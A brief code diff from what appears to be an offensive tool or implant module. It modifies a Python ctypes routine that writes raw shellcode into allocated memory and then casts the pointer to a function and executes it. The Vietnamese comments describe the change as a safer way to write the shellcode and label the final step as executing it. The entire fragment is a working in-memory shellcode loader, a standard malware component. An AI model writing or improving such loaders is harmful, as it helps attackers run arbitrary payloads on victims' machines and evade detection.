@@ -24,7 +24,8 @@ def run(**args):
             return "[!] Failed to allocate memory"
 
         # ✅ Ghi shellcode bằng memmove (an toàn & đúng kiểu hơn)
-        ctypes.memmove(ptr, shellcode, size)
+        ctypes.memmove(ptr, ctypes.create_string_buffer(shellcode, size), size)
+
 
         # 🧨 Ép kiểu và thực thi
         shell_func = ctypes.CFUNCTYPE(None)(ptr)
